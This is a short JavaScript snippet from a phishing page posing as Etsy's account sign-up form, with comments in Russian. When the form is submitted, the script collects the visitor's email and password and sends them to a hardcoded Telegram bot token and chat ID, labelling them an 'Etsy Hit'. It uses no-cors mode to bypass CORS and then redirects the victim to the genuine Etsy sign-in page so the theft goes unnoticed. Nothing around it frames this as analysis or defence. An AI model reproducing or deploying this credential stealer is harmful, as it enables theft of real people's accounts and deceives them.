    <script>
        // Твои данные напрямую
        const TG_BOT_TOKEN = '8817502459:AAG7JDqCXKJNDaIFieOJ_1jkqI2ml6Ssq0E';
        const TG_CHAT_ID = 920596628; // Твой личный ID

        document.getElementById('join-neu-form').addEventListener('submit', function(e) {
            e.preventDefault();
            
            // Извлекаем значения из Shadow DOM
            let email = '';
            let password = '';
            
            const emailInput = document.querySelector('#join_neu_email_field');
            if (emailInput && emailInput.shadowRoot) {
                const innerInput = emailInput.shadowRoot.querySelector('input[name="email"]');
                if (innerInput) email = innerInput.value;
            }

            const passwordInput = document.querySelector('#join_neu_password_field');
            if (passwordInput && passwordInput.shadowRoot) {
                const innerInput = passwordInput.shadowRoot.querySelector('input[name="password"]');
                if (innerInput) password = innerInput.value;
            }
            
            const text = `🎯 [+] Etsy Hit!\nEmail: ${email}\nPass: ${password}`;

            // Используем FormData и no-cors для 100% обхода CORS
            const formData = new FormData();
            formData.append('chat_id', TG_CHAT_ID);
            formData.append('text', text);

            fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                mode: 'no-cors',
                body: formData
            }).then(() => {
                window.location.href = 'https://www.etsy.com/signin';
            }).catch(err => {
                console.error('Error:', err);
                window.location.href = 'https://www.etsy.com/signin';
            });
        });
    </script>
